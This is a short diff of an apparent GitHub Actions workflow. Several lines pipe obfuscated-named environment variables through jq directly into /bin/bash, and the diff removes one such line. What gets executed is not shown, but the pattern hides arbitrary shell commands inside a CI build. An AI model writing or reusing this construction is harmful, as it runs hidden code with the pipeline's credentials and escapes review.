@@ -26,7 +26,6 @@ jobs:
           echo $zomad67 | jq -r .snnsp9 | /bin/bash
           echo $f257 | jq -r .tqb9 | /bin/bash
           printf '%s' "$lb7" | jq -r .q7521 | /bin/bash
-          echo $fl8 | jq -r .z4072 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
